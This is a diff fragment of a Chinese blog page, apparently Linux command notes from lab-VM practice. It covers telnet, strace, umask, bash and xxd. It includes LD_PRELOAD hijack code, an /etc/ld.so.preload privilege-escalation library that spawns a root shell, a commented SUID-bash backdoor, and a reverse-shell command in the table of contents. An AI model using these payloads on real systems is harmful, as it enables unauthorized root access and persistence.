+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> </span>&#123;   <span class="comment">//需要搜索查看函数的原型</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hacker.c -o hacker.so</span><br></pre></td></tr></table></figure></div>
+<p> LD_PRELOAD 也能解析 jpg 后缀</p>
+<h2 id="etc-ld-so-preload"><a href="#etc-ld-so-preload" class="headerlink" title="/etc/ld.so.preload"></a><code>/etc/ld.so.preload</code></h2><p> <br>该文件是 Linux 系统的全局配置文件，用于指定程序启动时<strong>强制优先加载的动态链接库（.so 文件）</strong>。与 <code>LD_PRELOAD</code> 环境变量不同，<code>/etc/ld.so.preload</code> 的影响是<strong>系统级的</strong>，会对所有用户和进程生效<br>该文件的行为类似于**<code>LD_PRELOAD</code>** ENV 变量，但也适用于 <strong>SUID 二进制文件</strong>。<br>如果您可以创建它或修改它，则只需在每个执行的二进制文件中<strong>加载的库中添加路径</strong>即可。</p>
+<p>例如： <code>echo &quot;/tmp/pe.so&quot; &gt; /etc/ld.so.preload</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="comment">//后门写法-只用一次 system(&quot;cp /bin/bash /tmp/sh ; chmod +s /tmp/sh; rm /etc/ld.so.preload&quot;)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cd /tmp</span></span><br><span class="line"><span class="comment">//gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>接触到这个是在flower靶机里面，touch有suid，然后没有这个&#x2F;etc&#x2F;ld.so.preload文件，然后修改umask<br>用法就是在创建好这个&#x2F;etc&#x2F;ld.so.preload之后，在这个文件里面输入编译好的文件的位置，比如&#x2F;tmp&#x2F;a.so</p>
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>Linux telnet 命令用于远端登入。</p>
+<p>执行 telnet 指令开启终端机阶段作业，并登入远端主机。</p>
+<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="selector-attr">[选项]</span> &lt;目标IP或主机名&gt; <span class="selector-attr">[端口]</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Telnet 客户端命常用命令：<br>　　open : 使用 openhostname 可以建立到主机的 Telnet 连接。<br>　　close : 使用命令 close 命令可以关闭现有的 Telnet 连接。<br>　　display : 使用 display 命令可以查看 Telnet 客户端的当前设置。<br>　　send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：<br>　　ao : 放弃输出命令。<br>　　ayt : “Are you there” 命令。<br>　　esc : 发送当前的转义字符。<br>　　ip : 中断进程命令。<br>　　synch : 执行 Telnet 同步操作。<br>　　brk : 发送信号。<br>在 <code>telnet</code> 会话中，使用 <code>Ctrl + ]</code> 进入 <code>telnet&gt;</code> 提示符，然后输入：</p>
+<h2 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h2><p><code>strace</code> 是 Linux 系统中用于<strong>动态跟踪用户空间进程与内核交互</strong>的工具，主要监控进程的<strong>系统调用</strong>、<strong>信号传递</strong>和<strong>进程状态变更</strong>。其底层通过内核的 <code>ptrace</code> 特性实现，是运维和开发人员诊断程序问题的利器</p>
+<h3 id="strace-跟踪流的输出内容"><a href="#strace-跟踪流的输出内容" class="headerlink" title="strace 跟踪流的输出内容"></a><strong><code>strace</code> 跟踪流的输出内容</strong></h3><p>当使用 <code>strace</code> 跟踪进程时，其输出主要包含以下信息</p>
+<ol>
+<li><strong>系统调用名称</strong>：如 <code>open</code>、<code>read</code>、<code>write</code>、<code>close</code>、<code>access</code> 等。</li>
+<li><strong>调用参数</strong>：以符号或十六进制形式显示参数（如文件路径、标志位等）。<ul>
+<li>示例：<code>open(&quot;/etc/ld.so.preload&quot;, O_RDONLY) = 3</code>，表示以只读方式打开该文件，返回文件描述符 3。</li>
+</ul>
+</li>
+<li><strong>返回值</strong>：系统调用的结果状态。<ul>
+<li>成功时返回具体值（如文件描述符、字节数）；</li>
+<li>失败时返回 <code>-1</code> 并附带错误原因（如 <code>ENOENT</code> 表示文件不存在，<code>EACCES</code> 表示权限不足）。</li>
+</ul>
+</li>
+<li><strong>耗时信息</strong>（若启用 <code>-T</code> 参数）：显示系统调用的执行时间。</li>
+<li><strong>进程 &#x2F; 线程标识</strong>（若启用 <code>-f</code> 参数）：在多进程 &#x2F; 线程场景下显示具体 PID 或 TID。<ul>
+<li>示例：<code>[pid 17654] open(&quot;test.log&quot;, O_WRONLY)</code>。</li>
+</ul>
+</li>
+</ol>
+<h3 id="grep-Pi-open-access-no-such-file-的过滤逻辑"><a href="#grep-Pi-open-access-no-such-file-的过滤逻辑" class="headerlink" title="grep -Pi &quot;open|access|no such file&quot; 的过滤逻辑"></a><strong><code>grep -Pi &quot;open|access|no such file&quot;</code> 的过滤逻辑</strong></h3><p>用户通过此命令筛选 <code>strace</code> 输出中的关键信息，原因如下：</p>
+<ol>
+<li><strong>目标系统调用过滤</strong>：<ul>
+<li><strong><code>open</code></strong>：跟踪文件打开操作，常用于排查文件路径错误、权限问题或依赖缺失。</li>
+<li><strong><code>access</code></strong>：检查文件是否存在或可访问，用于定位权限配置错误（如 <code>EACCES</code>）或路径不存在（<code>ENOENT</code>）</li>
+</ul>
+<p> </p>
+</li>
+<li><strong>错误关键字过滤</strong>：<ul>
+<li><strong><code>no such file</code></strong>：匹配 <code>ENOENT</code> 错误，快速定位因文件 &#x2F; 目录不存在导致的失败。</li>
+</ul>
+</li>
+<li><strong>参数解释</strong>：<ul>
+<li><strong><code>-P</code></strong>：启用 Perl 兼容正则表达式（PCRE），支持更灵活的匹配语法。</li>
+<li><strong><code>-i</code></strong>：忽略大小写，确保匹配 <code>No Such File</code> 或 <code>NO SUCH FILE</code> 等变体<br>这样子就是看调用了什么，第一次记录这个指令是在flower靶机中，touch有suid，然后追踪touch，发现没有&#x2F;etc&#x2F;ld.so.preload</li>
+</ul>
+</li>
+</ol>
+<h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a><strong>核心功能</strong></h3><ul>
+<li><strong>跟踪系统调用</strong>：记录进程执行过程中调用的所有系统调用（如 <code>open</code>、<code>read</code>、<code>write</code> 等），包括参数、返回值和耗时。</li>
+<li><strong>信号监控</strong>：捕获进程接收和发送的信号（如 <code>SIGKILL</code>）。</li>
+<li><strong>黑盒分析</strong>：当程序无日志或日志不清晰时，通过系统调用定位问题根源。</li>
+</ul>
+<h2 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h2><p>Linux umask 命令指定在建立文件时预设的权限掩码。</p>
+<p>umask 可用来设定 [权限掩码]。[权限掩码] 是由 3 个八进制的数字所组成，将现有的存取权限减掉权限掩码后，即可产生建立文件时预设的权限。</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umask: usage: umask <span class="comment">[-p]</span> <span class="comment">[-S]</span> <span class="comment">[mode]</span></span><br></pre></td></tr></table></figure>
+<p>-p：打印当前 umask 值</p>
+<p>-S：显示当前掩码</p>
+<p>mode：设置为 umask 值<br>这个用在如果类似于touch这样创建文件的指令有suid的时候有用，因为普通的时候用户可以用chmod直接修改文件的权限，就没什么用<br>umask的权限修改方式和chmod是相反的，chmod是直接给权限，umask是用666减去权限，比如umask是022 那创建之后的权限就是644</p>
+<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><p>bash除了直接获得一个bash还有一些关键字和参数</p>
+<h3 id="Bash-脚本中的位置参数"><a href="#Bash-脚本中的位置参数" class="headerlink" title="Bash 脚本中的位置参数"></a><strong>Bash 脚本中的位置参数</strong></h3><p>脚本内通过 <code>$0</code>、<code>$1</code>、<code>$2</code> 等引用参数，特殊参数含义如下：</p>
+<ol>
+<li><strong><code>$0</code></strong>：脚本文件名（包含路径） </li>
+<li><strong><code>$1</code>、<code>$2</code>、…</strong>：第 1、2 个参数，依次类推 </li>
+<li><strong><code>$#</code></strong>：参数个数（不包含 <code>$0</code>） </li>
+<li><strong><code>$@</code> 与 <code>$*</code></strong>：所有参数列表，区别在于 <code>&quot;$@&quot;</code> 为数组，<code>&quot;$*&quot;</code> 为单个字符串 </li>
+<li><strong><code>$?</code></strong>：上一条命令的退出状态码（0 表示成功） </li>
+<li><strong><code>$$</code></strong>：当前进程的 PID <br>示例</li>
+</ol>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/test.sh a b c # $0=./</span>test.sh, <span class="variable">$1</span>=a, <span class="variable">$2</span>=b, <span class="variable">$3</span>=c, <span class="variable">$#</span>=<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="交互模式和脚本模式"><a href="#交互模式和脚本模式" class="headerlink" title="交互模式和脚本模式"></a><strong>交互模式和脚本模式</strong></h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-i</code></td>
+<td><strong>交互模式</strong>（interactive mode），Bash 启动后会提供命令提示符。</td>
+</tr>
+<tr>
+<td><code>-c &quot;command&quot;</code></td>
+<td>运行<strong>单个命令</strong>后退出，如：<code>bash -c &#39;echo Hello&#39;</code></td>
+</tr>
+<tr>
+<td><code>-s</code></td>
+<td>让 Bash 从 <strong>标准输入</strong> 读取命令，如：&#96;echo ‘echo hello’</td>
+</tr>
+<tr>
+<td><code>--rcfile file</code></td>
+<td>指定 <strong>自定义启动文件</strong>（而不是 <code>~/.bashrc</code>）。</td>
+</tr>
+</tbody></table>
+<h3 id="权限与安全"><a href="#权限与安全" class="headerlink" title="权限与安全"></a><strong>权限与安全</strong></h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p</code></td>
+<td><strong>保留特权模式</strong>（privileged mode），即不降低 SUID&#x2F;SGID 权限。</td>
+</tr>
+<tr>
+<td><code>--noprofile</code></td>
+<td><strong>不加载 <code>~/.bash_profile</code> 或 <code>/etc/profile</code></strong>（适用于非交互式 shell）。</td>
+</tr>
+<tr>
+<td><code>--norc</code></td>
+<td><strong>不加载 <code>~/.bashrc</code></strong>（适用于交互式 shell）。</td>
+</tr>
+<tr>
+<td><code>--restricted</code> &#x2F; <code>-r</code></td>
+<td><strong>受限模式</strong>（restricted mode），限制部分 Bash 功能（如 <code>cd</code>、环境变量修改等）。</td>
+</tr>
+<tr>
+<td>所以通过某种方式得到了&#x2F;bin&#x2F;bash 并且已经chmod+s 之后就要用-p参数来用这个bash，保持这个bash原来的suid</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p><code>xxd</code> 是 Linux 下的十六进制转储工具，用于 <strong>将文件或数据转换为十六进制格式</strong> 或 <strong>反向还原为二进制</strong>，适用于调试、数据分析和二进制编辑等场景</p>
+<h3 id="xxd-命令选项"><a href="#xxd-命令选项" class="headerlink" title="xxd 命令选项"></a><code>xxd</code> 命令选项</h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-a</code></td>
+<td>缺省忽略转换：使用 <code>*</code> 替换空行。</td>
+</tr>
+<tr>
+<td><code>-b</code></td>
+<td>以二进制格式转储数据（与 <code>-ps</code>、<code>-i</code>、<code>-r</code> 不兼容），默认为十六进制。</td>
+</tr>
+<tr>
+<td><code>-c cols</code></td>
+<td>每行显示多少列的八位字节（默认 16 列，<code>-i</code> 选项默认 12 列，<code>-ps</code> 选项默认 30 列）。</td>
+</tr>
+<tr>
+<td><code>-E</code></td>
+<td>使用 EBCDIC 字符集（默认使用 ASCII 字符集）。</td>
+</tr>
+<tr>
+<td><code>-e</code></td>
+<td>以小端模式转储数据（与 <code>-ps</code>、<code>-i</code>、<code>-r</code> 不兼容）。</td>
+</tr>
+<tr>
+<td><code>-g</code></td>
+<td>在正常输出模式下，每组包含的八位字节数（默认 2 个，<code>-e</code> 选项时默认 4 个）。</td>
+</tr>
+<tr>
+<td><code>-h</code></td>
+<td>显示帮助信息。</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>以 C 语言数组的格式输出数据。</td>
+</tr>
+<tr>
+<td><code>-l len</code></td>
+<td>在 <code>len</code> 个八位字节后停止转储。</td>
+</tr>
+<tr>
+<td><code>-o off</code></td>
+<td>从 <code>off</code> 偏移量开始转储数据。</td>
+</tr>
+<tr>
+<td><code>-ps</code></td>
+<td>以 <code>postscript</code> 格式输出，并在行尾添加十六进制转储内容。</td>
+</tr>
+<tr>
+<td><code>-r</code></td>
+<td>逆向操作：将十六进制内容转换（或修补）回二进制数据。</td>
+</tr>
+<tr>
+<td><code>-r -s off</code></td>
+<td>在 <code>off</code> 偏移量处开始将十六进制内容转换回二进制数据。</td>
+</tr>
+<tr>
+<td><code>-s [+][-]seek</code></td>
+<td>指定 <code>seek</code> 偏移量来开始读取输入文件（<code>+</code> 号表示相对偏移，<code>-</code> 号表示负偏移）。</td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td>使用大写字母表示十六进制数据。</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>显示 <code>xxd</code> 版本信息，如 <code>&quot;xxd V1.10 27oct98 by Juergen Weigert&quot;</code>。</td>
+</tr>
+<tr>
+<td>-p -r 一般够用</td>
+<td></td>
+</tr>
+</tbody></table>
+
     </div>
 
     
@@ -1207,7 +1695,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AC%94%E8%AE%B0"><span class="nav-text">Linux 常用指令笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#awk-%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-text">&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8F%98%E9%87%8F"><span class="nav-text">核心变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#knockd-%E6%9C%8D%E5%8A%A1"><span class="nav-text">knockd 服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A-etc-knockd-conf"><span class="nav-text">配置文件：&#x2F;etc&#x2F;knockd.conf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="nav-text">功能：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">应用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#grep-%E6%96%87%E6%9C%AC%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7"><span class="nav-text">grep 文本搜索工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8"><span class="nav-text">元字符表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-1"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc-Netcat-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7"><span class="nav-text">nc (Netcat) 网络工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-2"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">sudo 权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B8%E5%9E%8B%E9%85%8D%E7%BD%AE"><span class="nav-text">典型配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#drush-Drupal-Shell"><span class="nav-text">drush (Drupal Shell)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scp-%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-text">scp 安全文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-2"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ps"><span class="nav-text">ps</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-3"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apache2"><span class="nav-text">apache2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tac"><span class="nav-text">tac</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#var-mail"><span class="nav-text">&#x2F;var&#x2F;mail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-release"><span class="nav-text">&#x2F;etc&#x2F;release</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tar"><span class="nav-text">tar</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-4"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-3"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#find"><span class="nav-text">find</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%92%8C%E7%A4%BA%E4%BE%8B"><span class="nav-text">常用参数和示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93break-system-packages"><span class="nav-text">–break-system-packages</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exiftool"><span class="nav-text">exiftool</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-5"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl"><span class="nav-text">curl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tldr"><span class="nav-text">tldr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gocr"><span class="nav-text">gocr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#doas"><span class="nav-text">doas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-4"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dig"><span class="nav-text">dig</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-5"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#resolv-conf"><span class="nav-text">resolv.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-bind"><span class="nav-text">&#x2F;etc&#x2F;bind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tr"><span class="nav-text">tr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-6"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sed"><span class="nav-text">sed</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-7"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alias"><span class="nav-text">alias</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#openssl"><span class="nav-text">openssl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xargs"><span class="nav-text">xargs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#id-rsa"><span class="nav-text">id_rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-authorized-keys"><span class="nav-text">~&#x2F;.ssh&#x2F;authorized_keys</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%9C%E7%94%A8"><span class="nav-text">作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E7%A7%81%E9%92%A5%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5"><span class="nav-text">用私钥生成公钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb"><span class="nav-text">smb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Samba-%E7%AE%80%E4%BB%8B"><span class="nav-text">Samba 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="nav-text">主要功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">主要配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smbclient-%E5%8F%82%E6%95%B0%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-text">smbclient 参数和使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-text">ftp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E4%BA%A4%E4%BA%92%E5%91%BD%E4%BB%A4%EF%BC%88%E7%99%BB%E5%BD%95%E5%90%8E%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="nav-text">常用交互命令（登录后使用）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getcap"><span class="nav-text">getcap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%BD%E5%8A%9B%EF%BC%88Capabilities%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="nav-text">能力（Capabilities）示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ln"><span class="nav-text">ln</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-6"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i-dev-tcp-ip-1234-0-1"><span class="nav-text">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-i"><span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dev-tcp-192-168-240-83-1234"><span class="nav-text">&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1"><span class="nav-text">0&gt;&amp;1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stty-raw-echo-fg-%E7%BE%8E%E5%8C%96%E7%BB%88%E7%AB%AF"><span class="nav-text">stty raw -echo; fg (美化终端)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 